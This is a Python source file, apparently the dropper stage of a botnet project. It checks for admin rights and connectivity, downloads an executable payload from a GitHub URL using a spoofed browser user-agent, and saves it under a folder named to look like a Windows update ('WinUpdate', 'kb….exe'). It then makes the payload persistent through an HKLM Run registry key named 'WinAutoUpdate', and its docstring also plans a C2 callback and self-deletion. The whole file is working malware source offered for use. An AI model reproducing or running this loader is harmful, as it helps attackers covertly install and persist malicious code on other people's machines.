"""
Always run on boot
[X] It will first check if ran as administrator, and has internet connectivity.
[] It will then download the payload hosted on github and save on disk.
[] It will then do a *callback to the C2 to establish alive.
[] It will then create persistence for the payload via [service | registry key].
[] Lastly, it will delete itself off the disk.
"""
try:
    import _winreg as winreg
except ImportError:
    # this has been renamed in python 3
    import winreg
import ctypes  # An included library with Python install.
import os
import shutil
import sys
from random import randint
from urllib.error import URLError
from urllib.request import urlopen

import requests

KEY_PATH = r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
PAYLOAD_URL = r"https://github.com/notclement/botnet-enumeration-network/raw/master/resources/payload.txt"
GOOGLE_DNS = 'http://www.google.com'
PATH_TO_HIDE = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))


def test_connectivity(google_dns):
    """Return True if there is internet connectivity.
    Returns False if there is no internet connectivity.
    """
    try:
        urlopen(google_dns, timeout=1)
        return 1
    except URLError as err:
        return 0


def test_is_admin():
    """Returns True if the program is ran as administrator.
    Returns False if not ran as administrator.
    """
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == 1:
        return 1
    else:
        return 0


def create_persistence(key_path, path):
    """Creates persistence via the run registry key"""
    key_handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0,
                                winreg.KEY_ALL_ACCESS)
    key_data = r"{}".format(path)
    winreg.SetValueEx(key_handle, "WinAutoUpdate", 0, winreg.REG_SZ, key_data)
    print("key written")
    winreg.CloseKey(key_handle)


def get_payload_to_path_and_persistence(payload_url, path_to_hide):
    """Reaches out to github to retrieve the payload
    Then creates persistence"""
    full_path_to_hide = path_to_hide + '\\kb{}.exe'.format(
        randint(1000000000, 9999999999))

    if os.path.exists(path_to_hide):
        shutil.rmtree(path_to_hide)
    else:
        pass
    os.makedirs(path_to_hide)

    with open(full_path_to_hide, 'wb') as file:
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
        response = requests.get(payload_url, headers)
        file.write(response.content)
    print('Payload dropped into \'{}\''.format(full_path_to_hide))
    create_persistence(KEY_PATH, full_path_to_hide)


def main():
    if test_is_admin():
        if test_connectivity(GOOGLE_DNS):
            get_payload_to_path_and_persistence(PAYLOAD_URL, PATH_TO_HIDE)
        else:
            print('Ran as Admin but no internet connectivity.')
    else:
        print('Not ran as Admin.')
    sys.exit(1)


if __name__ == '__main__':
    main()
